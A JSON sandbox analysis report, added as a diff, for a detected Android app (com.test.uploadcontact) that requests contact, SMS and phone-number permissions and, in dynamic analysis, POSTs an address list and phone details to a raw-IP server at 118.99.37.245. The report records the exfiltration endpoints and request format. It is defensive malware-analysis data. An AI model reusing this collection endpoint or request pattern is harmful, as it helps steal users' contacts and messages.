@@ -1,0 +1,381 @@
+{
+    "apk_info": {
+        "id": "KByDd2AbqW6OY8mn",
+        "url": "https://developer.koodous.com/apks/b4eb19acff49bfe3de0018232893763e361f172f968df8e89aace2f078a7656e/",
+        "sha256": "b4eb19acff49bfe3de0018232893763e361f172f968df8e89aace2f078a7656e",
+        "md5": "67466f875e1b00c6ec9abcaa0905e89c",
+        "sha1": "81849a70778485786a5344ce6b42d106804eec3b",
+        "app": "写メボックス",
+        "package_name": "com.test.uploadcontact",
+        "company": "Android",
+        "version": "2.2",
+        "image": "https://developer.koodous.com/media/apk_images/48/b0/48b014f98480e375e6bf5c5bd6c75b3404a0c5d69e204f29aa0b1573ccdccb1e",
+        "size": 1354645,
+        "tags": [],
+        "is_trusted": false,
+        "is_installed": false,
+        "rating": -2,
+        "is_detected": true,
+        "is_corrupted": false,
+        "last_scan": null,
+        "is_static_analyzed": true,
+        "is_dynamic_analyzed": true,
+        "is_false_positive": false,
+        "last_yara_analysis_at": null,
+        "matches_count": 17,
+        "comments_count": 0,
+        "votes_count": 2,
+        "created_at": "2020-02-13T05:29:57+01:00",
+        "updated_at": "2023-03-30T19:03:25.462938+02:00"
+    },
+    "static_analysis": {
+        "cuckoo": {
+            "target": {
+                "file": {
+                    "md5": "67466f875e1b00c6ec9abcaa0905e89c",
+                    "sha1": "81849a70778485786a5344ce6b42d106804eec3b",
+                    "size": 1354645,
+                    "crc32": "A86F1708",
+                    "sha256": "b4eb19acff49bfe3de0018232893763e361f172f968df8e89aace2f078a7656e",
+                    "sha512": "8f4440024785bfc31e0397898628308ad36ec70b783c9dbda5d917bf67b4bb1174d38cb07274cd933589bb05b325e7717fe6d4362d59cb378b107f410bbb20d4",
+                    "ssdeep": "24576:/tb7KQE6xwDJNvRQJ/Cgu9MUJ1V91LDsgyqBMwb+83bLsRagvZd3JGO:laQRGJO6gron95YgFB3b33bNgvZ5JGO"
+                },
+                "category": "file"
+            },
+            "network": {
+                "dns": [],
+                "irc": [],
+                "http": [
+                    {
+                        "uri": "http://118.99.37.245:8080/JYSystem/restInt/collect/postData",
+                        "body": "{\"addressList\":\"[]\",\"createTime\":\"1\",\"phoneId\":\"\",\"phoneNumber\":\"\",\"phoneSystem\":\"and\"}",
+                        "data": "POST /JYSystem/restInt/collect/postData HTTP/1.1\r\naccept: */*\r\nContent-Type: application/json;charset=utf-8\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 118.99.37.245:8080\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nContent-Length: 87\r\n\r\n{\"addressList\":\"[]\",\"createTime\":\"1\",\"phoneId\":\"\",\"phoneNumber\":\"\",\"phoneSystem\":\"and\"}",
+                        "host": "118.99.37.245:8080",
+                        "path": "/JYSystem/restInt/collect/postData",
+                        "port": 8080,
+                        "method": "POST",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    }
+                ],
+                "smtp": [],
+                "hosts": [
+                    "118.99.37.245"
+                ],
+                "domains": []
+            }
+        },
+        "androguard": {
+            "urls": [
+                "http://schemas.android.com/apk/res/android",
+                "http://118.99.37.245:8080/JYSystem/restInt/collect/alive",
+                "http://118.99.37.245:8080/JYSystem/restInt/collect/postMsgData",
+                "http://118.99.37.245:8080/JYSystem/restInt/collect/postData"
+            ],
+            "dexes": {
+                "classes": {
+                    "sha256": "6e0d57cfc2d7ef4770841ae51a1a111f56121f85008d6938a367d5d8d20a3b7e",
+                    "ssdeep": "24576:RQBdIAW5tmZuiXAXQXUXY/5ir1P6FwMt9GaOtTSBBPt1c:RM7hK62Y/5ixTYB6"
+                }
+            },
+            "api_key": {},
+            "cordova": "",
+            "filters": [
+                "android.intent.action.MY_PACKAGE_UNSUSPENDED",
+                "android.intent.action.BATTERY_CHANGED",
+                "service_destroy",
+                "android.intent.action.MY_PACKAGE_SUSPENDED",
+                "android.intent.action.PACKAGE_CHANGED",
+                "android.intent.action.NEW_OUTGOING_CALL",
+                "android.provider.Telephony.SMS_RECEIVED",
+                "android.intent.action.HEADSET_PLUG",
+                "android.intent.action.BOOT_COMPLETED",
+                "android.intent.action.DOCK_EVENT",
+                "aaaac",
+                "android.intent.action.MAIN",
+                "android.intent.action.USER_PRESENT"
+            ],
+            "app_name": "写メボックス",
+            "services": [
+                "com.test.uploadcontact.SMSService",
+                "com.test.uploadcontact.Alarm.PollingService"
+            ],
+            "wearable": false,
+            "androidtv": false,
+            "libraries": [],
+            "providers": [],
+            "receivers": [
+                "com.test.uploadcontact.SMSReceiver"
+            ],
+            "activities": [
+                "com.test.uploadcontact.MainActivity"
+            ],
+            "certificate": {
+                "sha1": "61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81",
+                "serial": "936EACBE07F201DF",
+                "issuerDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_after": "Jul 17 01:33:46 2035 GMT",
+                "subjectDN": "/C=US/ST=California/L=Mountain View/O=Android/OU=Android/CN=Android/emailAddress=android@android.com",
+                "not_before": "Feb 29 01:33:46 2008 GMT"
+            },
+            "permissions": [
+                "android.permission.READ_PHONE_NUMBERS",
+                "android.permission.READ_EXTERNAL_STORAGE",
+                "android.permission.READ_PHONE_STATE",
+                "android.permission.RECEIVE_SMS",
+                "android.permission.INTERNET",
+                "android.permission.WRITE_EXTERNAL_STORAGE",
+                "android.permission.READ_CONTACTS",
+                "android.permission.READ_SMS"
+            ],
+            "package_name": "com.test.uploadcontact",
+            "version_code": "2002",
+            "main_activity": "com.test.uploadcontact.MainActivity",
+            "signature_name": "META-INF/CERT.RSA",
+            "functionalities": {
+                "ssl": [
+                    {
+                        "code": "const-string v2, 'https://'",
+                        "class": "Landroid/support/v4/text/util/LinkifyCompat;",
+                        "method": "addLinks"
+                    },
+                    {
+                        "code": "const-string v1, \"(((?:(?i:http|https|rtsp)://(?:(?:[a-zA-Z0-9\\\\$\\\\-\\\\_\\\\.\\\\+\\\\!\\\\*\\\\'\\\\(\\\\)\\\\,\\\\;\\\\?\\\\&\\\\=]|(?:\\\\%[a-fA-F0-9]{2})){1,64}(?:\\\\:(?:[a-zA-Z0-9\\\\$\\\\-\\\\_\\\\.\\\\+\\\\!\\\\*\\\\'\\\\(\\\\)\\\\,\\\\;\\\\?\\\\&\\\\=]|(?:\\\\%[a-fA-F0-9]{2})){1,25})?\\\\@)?)?(?:\"",
+                        "class": "Landroid/support/v4/util/PatternsCompat;",
+                        "method": "<clinit>"
+                    },
+                    {
+                        "code": "const-string v1, \"((?:\\\\b|$|^)(?:(?:(?i:http|https|rtsp)://(?:(?:[a-zA-Z0-9\\\\$\\\\-\\\\_\\\\.\\\\+\\\\!\\\\*\\\\'\\\\(\\\\)\\\\,\\\\;\\\\?\\\\&\\\\=]|(?:\\\\%[a-fA-F0-9]{2})){1,64}(?:\\\\:(?:[a-zA-Z0-9\\\\$\\\\-\\\\_\\\\.\\\\+\\\\!\\\\*\\\\'\\\\(\\\\)\\\\,\\\\;\\\\?\\\\&\\\\=]|(?:\\\\%[a-fA-F0-9]{2})){1,25})?\\\\@)?)(?:\"",
+                        "class": "Landroid/support/v4/util/PatternsCompat;",
+                        "method": "<clinit>"
+                    }
+                ],
+                "imei": [
+                    {
+                        "code": "invoke-virtual v10, Landroid/view/KeyEvent;->getDeviceId()I",
+                        "class": "Landroid/support/v7/app/AppCompatDelegateImpl;",
+                        "method": "preparePanel"
+                    },
+                    {
+                        "code": "invoke-virtual v6, Landroid/view/KeyEvent;->getDeviceId()I",
+                        "class": "Landroid/support/v7/app/ToolbarActionBar;",
+                        "method": "onKeyShortcut"
+                    },
+                    {
+                        "code": "invoke-virtual v6, Landroid/view/KeyEvent;->getDeviceId()I",
+                        "class": "Landroid/support/v7/app/WindowDecorActionBar;",
+                        "method": "onKeyShortcut"
+                    }
+                ],
+                "socket": [
+                    {
+                        "code": "invoke-virtual v1, v8, v7, Landroid/os/ResultReceiver;->send(I Landroid/os/Bundle;)V",
+                        "class": "Landroid/support/v13/view/inputmethod/InputConnectionCompat;",
+                        "method": "handlePerformPrivateCommand"
+                    },
+                    {
+                        "code": "invoke-virtual v1, v0, v7, Landroid/os/ResultReceiver;->send(I Landroid/os/Bundle;)V",
+                        "class": "Landroid/support/v13/view/inputmethod/InputConnectionCompat;",
+                        "method": "handlePerformPrivateCommand"
+                    },
+                    {
+                        "code": "invoke-interface v0, v2, Landroid/support/v4/app/NotificationManagerCompat$Task;->send(Landroid/support/v4/app/INotificationSideChannel;)V",
+                        "class": "Landroid/support/v4/app/NotificationManagerCompat$SideChannelManager;",
+                        "method": "processListenerQueue"
+                    }
+                ],
+                "runbinary": [
+                    {
+                        "code": "invoke-static Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;",
+                        "class": "Lcom/test/uploadcontact/LogcatHelper$LogDumper;",
+                        "method": "run"
+                    },
+                    {
+                        "code": "invoke-virtual v1, v2, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;",
+                        "class": "Lcom/test/uploadcontact/LogcatHelper$LogDumper;",
+                        "method": "run"
+                    }
+                ],
+                "phonenumber": [
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/test/uploadcontact/MainActivity;",
+                        "method": "goon"
+                    },
+                    {
+                        "code": "invoke-virtual v0, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/test/uploadcontact/MainActivity;",
+                        "method": "goon"
+                    },
+                    {
+                        "code": "invoke-virtual v4, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;",
+                        "class": "Lcom/test/uploadcontact/MainActivity;",
+                        "method": "permissionGranted"
+                    }
+                ],
+                "dynamicbroadcastreceiver": [
+                    {
+                        "code": "invoke-virtual v0, v1, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V",
+                        "class": "Landroid/support/v7/app/AppCompatDelegateImpl$AutoNightModeManager;",
+                        "method": "cleanup"
+                    },
+                    {
+                        "code": "invoke-virtual v0, v1, v2, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver; Landroid/content/IntentFilter;)Landroid/content/Intent;",
+                        "class": "Landroid/support/v7/app/AppCompatDelegateImpl$AutoNightModeManager;",
+                        "method": "setup"
+                    }
+                ]
+            },
+            "max_sdk_version": "",
+            "min_sdk_version": 15,
+            "new_permissions": [],
+            "displayed_version": "2.2",
+            "target_sdk_version": 25
+        }
+    },
+    "dynamic_analysis": {
+        "droidbox": {
+            "dns": [
+                {
+                    "ip": "118.99.37.245",
+                    "hostname": "118.99.37.245"
+                }
+            ],
+            "recvnet": [
+                {
+                    "pid": 852,
+                    "tid": 705539496,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Thu, 13 Feb 2020 04:57:07 GMT\r\n\r\n2c\r\n{\"res\":0,\"resMsg\":\"数据重复\",\"obj\":null}\r\n0\r\n\r\n",
+                    "time": 7.907966,
+                    "srchost": "118.99.37.245",
+                    "srcport": 8080,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "sendnet": [
+                {
+                    "pid": 852,
+                    "tid": 705539496,
+                    "data": "POST /JYSystem/restInt/collect/postData HTTP/1.1\r\naccept: */*\r\nContent-Type: application/json;charset=utf-8\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: 118.99.37.245:8080\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\nContent-Length: 87\r\n\r\n{\"addressList\":\"[]\",\"createTime\":\"1\",\"phoneId\":\"\",\"phoneNumber\":\"\",\"phoneSystem\":\"and\"}",
+                    "time": 7.451295,
+                    "desthost": "118.99.37.245",
+                    "destport": 8080,
+                    "processname": "com.test.uploadcontact"
+                }
+            ],
+            "sendsms": [],
+            "dexclass": [
+                {
+                    "pid": 852,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.test.uploadcontact-1.apk",
+                    "time": 0.089506,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 869,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.test.uploadcontact-1.apk",
+                    "time": 4.45219,
+                    "processname": "com.test.uploadcontact:smssms"
+                }
+            ],
+            "filesread": [
+                {
+                    "pid": 852,
+                    "tid": 705701072,
+                    "data": ": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1771997459, \"id\": 141073870640852, \"data\": \"78686470692d76342f6162635f69635f6d656e755f73686172655f6d74726c5f616c7068612e706e6735d905000400000000504b01020a000a000008000037545d382f7a9e24570200005702000032000900000000000000000000008bbc0d007265732f\", \"tid\": 1073870640, \"pid\": 852} }\nW/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1771997459, \"id\": 141073870640852, \"data\": \"6472617761626c652d787878686470692d76342f6162635f69635f737461725f626c61636b5f313664702e706e6735d905000400000000504b01020a000a000008000037545d380b7bf297f5040000f504000032000900000000000000000000003bbf0d\", \"tid\": 1073870640, \"pid\": 852} }\nW/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1771997459, \"id\": 141073870640852, \"data\": \"007265732f64726177",
+                    "name": "pipe:[2813]",
+                    "time": 8.806495,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 852,
+                    "tid": 705701072,
+                    "data": "W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"78745f73656c6563745f68616e646c655f6d6964646c655f6d74726c5f6c696768742e706e6735d90300040000504b01020a000a000008000037545d38e1533ed6a6010000a601000041000000000000000000000000000d860d007265732f6472617761\", \"tid\": 1073870640, \"pid\": 852} }\nW/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"0d007265732f6472617761626c652d7878686470692d76342f6162635f746578745f73656c6563745f68616e646c655f72696768745f6d74726c5f6c696768742e706e6735d902000400504b01020a000a000008000037545d38a1f78d30c7000000c700\", \"tid\": 1073870640, \"pid\": 852} }\nW/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 19792",
+                    "name": "pipe:[2813]",
+                    "time": 3.10354,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 852,
+                    "tid": 1073870640,
+                    "data": "504b050600000000b801b801b8ae0000c7fc13000000504b01020a000a000008080037545d38b504a9569206000068190000130000000000000000000000000000000000416e64726f69644d616e69666573742e786d6c504b01020a000a000008000037545d384cfed95c06000000060000002a00010000000000000000000000c30600004d4554412d494e462f616e64726f69642e617263682e636f72655f72756e74696d652e76657273696f6e00504b01020a000a000008000037545d384cfed95c06000000060000003500070000000000000000000000120700004d4554412d494e462f616e64726f69642e617263682e6c6966656379636c655f6c697665646174612d636f72652e76657273696f6e35d90300040000504b01020a000a000008000037545d384cfed95c06000000060000003000000000000000000000000000720700004d4554412d494e462f616e64726f69642e617263682e6c6966656379636c655f6c697665646174612e76657273696f6e504b01020a000a000008000037545d384cfed95c06000000060000002f00090000000000000000000000c60700004d4554412d494e462f616e64726f69642e617263682e6c6966656379636c655f72756e74696d652e76657273696f6e35d905000400000000504b01020a000a000008000037545d384cfed95c0600000006000000310007000000",
+                    "name": "/data/app/com.test.uploadcontact-1.apk",
+                    "time": 0.138294,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 869,
+                    "tid": 1073870640,
+                    "data": "504b050600000000b801b801b8ae0000c7fc13000000504b01020a000a000008080037545d38b504a9569206000068190000130000000000000000000000000000000000416e64726f69644d616e69666573742e786d6c504b01020a000a000008000037545d384cfed95c06000000060000002a00010000000000000000000000c30600004d4554412d494e462f616e64726f69642e617263682e636f72655f72756e74696d652e76657273696f6e00504b01020a000a000008000037545d384cfed95c06000000060000003500070000000000000000000000120700004d4554412d494e462f616e64726f69642e617263682e6c6966656379636c655f6c697665646174612d636f72652e76657273696f6e35d90300040000504b01020a000a000008000037545d384cfed95c06000000060000003000000000000000000000000000720700004d4554412d494e462f616e64726f69642e617263682e6c6966656379636c655f6c697665646174612e76657273696f6e504b01020a000a000008000037545d384cfed95c06000000060000002f00090000000000000000000000c60700004d4554412d494e462f616e64726f69642e617263682e6c6966656379636c655f72756e74696d652e76657273696f6e35d905000400000000504b01020a000a000008000037545d384cfed95c0600000006000000310007000000",
+                    "name": "/data/app/com.test.uploadcontact-1.apk",
+                    "time": 4.488572,
+                    "processname": "com.test.uploadcontact:smssms"
+                },
+                {
+                    "pid": 869,
+                    "tid": 705668216,
+                    "data": "W/DroidBox(  852): writeBytes: fd: FileDescriptor[35], byteCount: 116, offset: 0\nW/dalvikvm(  852): DroidBox: { \"FdAccess\": { \"path\": \"2f646174612f646174612f636f6d2e746573742e75706c6f6164636f6e746163742f66696c65732f55706c6f61642f4c6f672f4c6f672d323031352d30332d31332e6c6f67676572\", \"id\": 149029917, \"tid\": 705701072 } }\nW/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\nW/DroidBox(  852): DroidBox: { \"FileWritten\": {\"nameId\": 149029917, \"id\": 22705701072852, \"data\": \"323031352d30332d31332031383a31353a33302d2d442f64616c76696b766d282020383532293a2047435f434f4e43555252454e54206672656564203433314b2c203825206672656520363939394b2f373535394b2c207061757365642032316d732b32\", \"tid\": 705701072, \"pid\": 852} }\nW/DroidBox(  869): DroidBox: { \"FileRead\": {\"nameId\": 1369412837, \"id\": 141073870640869, \"data\": \"000000000070cb0d007265732f6472617761626c652d787878686470692d76342f6162635f69635f737461725f68616c665f626c61636b5f313664702e706e6735d90300040000504b01020a000a000008000037545d3",
+                    "name": "pipe:[2853]",
+                    "time": 8.276484,
+                    "processname": "com.test.uploadcontact:smssms"
+                }
+            ],
+            "libraries": [],
+            "phonecalls": [],
+            "cryptousage": [],
+            "fileswritten": [
+                {
+                    "pid": 852,
+                    "tid": 705701072,
+                    "data": "2015-03-13 18:15:30--D/dalvikvm(  852): GC_CONCURRENT freed 431K, 8% free 6999K/7559K, paused 21ms+21ms, total 72ms\n2015-03-13 18:15:31--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\n2015-03-13 18:15:31--W/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"656c645f7365617263685f64656661756c745f6d74726c5f616c7068612e392e706e6735d90300040000504b01020a000a000008000037545d387c31d19613010000130100003800000000000000000000000000b68e0d007265732f6472617761626c65\", \"tid\": 1073870640, \"pid\": 852} }\n2015-03-13 18:15:31--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\n2015-03-13 18:15:31--W/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"2d787878686470692d76342f6162635f62746e5f636865636b5f746f5f6f6e5f6d74726c5f3030302e706e67504b01020a000a000008000037545d383b74dec4dc010000dc01000038000700000000000000000000001f900d007265732f647261",
+                    "name": "/data/data/com.test.uploadcontact/files/Upload/Log/Log-2015-03-13.logger",
+                    "time": 7.451675,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 852,
+                    "tid": 705692816,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"lastid\" value=\"0\" />\n</map>\n",
+                    "name": "/data/data/com.test.uploadcontact/shared_prefs/config.xml",
+                    "time": 7.428556,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 852,
+                    "tid": 705701072,
+                    "data": "2015-03-13 18:15:26--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\n2015-03-13 18:15:27--W/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"78745f73656c6563745f68616e646c655f6d6964646c655f6d74726c5f6c696768742e706e6735d90300040000504b01020a000a000008000037545d38e1533ed6a6010000a601000041000000000000000000000000000d860d007265732f6472617761\", \"tid\": 1073870640, \"pid\": 852} }\n2015-03-13 18:15:27--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\n2015-03-13 18:15:27--W/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"0d007265732f6472617761626c652d7878686470692d76342f6162635f746578745f73656c6563745f68616e646c655f72696768745f6d74726c5f6c696768742e706e6735d902000400504b01020a000a000008000037545d38a1f78d30c7000000c700\", \"tid\": 1073870640, \"pid\": 852} }\n2015-03-13 18:15:27--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processn",
+                    "name": "/data/data/com.test.uploadcontact/files/Upload/Log/Log-2015-03-13.logger",
+                    "time": 3.141753,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 852,
+                    "tid": 705701072,
+                    "data": "2015-03-13 18:15:31--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\n2015-03-13 18:15:31--W/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"6c652d787878686470692d76342f6162635f62746e5f636865636b5f746f5f6f6e5f6d74726c5f3031352e706e6735d90300040000504b01020a000a000008000037545d380c0eea1c1103000011030000380006000000000000000000000058920d0072\", \"tid\": 1073870640, \"pid\": 852} }\n2015-03-13 18:15:31--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact\", \"pid\": 852} }\n2015-03-13 18:15:31--W/DroidBox(  852): DroidBox: { \"FileRead\": {\"nameId\": 1979290044, \"id\": 141073870640852, \"data\": \"65732f6472617761626c652d787878686470692d76342f6162635f62746e5f726164696f5f746f5f6f6e5f6d74726c5f3030302e706e6735d902000400504b01020a000a000008000037545d3875590e60b2030000b20300003800090000000000000000\", \"tid\": 1073870640, \"pid\": 852} }\n2015-03-13 18:15:31--W/dalvikvm(  852): DroidBox: { \"Process\": { \"processn",
+                    "name": "/data/data/com.test.uploadcontact/files/Upload/Log/Log-2015-03-13.logger",
+                    "time": 8.146548,
+                    "processname": "com.test.uploadcontact"
+                },
+                {
+                    "pid": 869,
+                    "tid": 705668216,
+                    "data": "2015-03-13 18:15:32--W/DroidBox(  869): DroidBox: { \"FileRead\": {\"nameId\": 1369412837, \"id\": 141073870640869, \"data\": \"000000000070cb0d007265732f6472617761626c652d787878686470692d76342f6162635f69635f737461725f68616c665f626c61636b5f313664702e706e6735d90300040000504b01020a000a000008000037545d38432b929cf8020000f802000037\", \"tid\": 1073870640, \"pid\": 869} }\n2015-03-13 18:15:32--W/dalvikvm(  869): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact:smssms\", \"pid\": 869} }\n2015-03-13 18:15:32--W/DroidBox(  869): DroidBox: { \"FileRead\": {\"nameId\": 1369412837, \"id\": 141073870640869, \"data\": \"0007000000000000000000000044cd0d007265732f6472617761626c652d787878686470692d76342f6162635f69635f737461725f68616c665f626c61636b5f333664702e706e6735d90300040000504b01020a000a000008000037545d38d9e8d6f4df\", \"tid\": 1073870640, \"pid\": 869} }\n2015-03-13 18:15:32--W/dalvikvm(  869): DroidBox: { \"Process\": { \"processname\": \"com.test.uploadcontact:smssms\", \"pid\": 869} }\n2015-03-13 18:15:32--D/dalvikvm(  869): GC_CONCURRENT freed ",
+                    "name": "/data/data/com.test.uploadcontact/files/Upload/Log/Log-2015-03-13.logger",
+                    "time": 8.992543,
+                    "processname": "com.test.uploadcontact:smssms"
+                }
+            ],
+            "servicestart": [
+                {
+                    "pid": 852,
+                    "tid": 1073870640,
+                    "name": "com.test.uploadcontact.SMSService",
+                    "time": 3.938406,
+                    "processname": "com.test.uploadcontact"
+                }
+            ]
+        }
+    }
+}
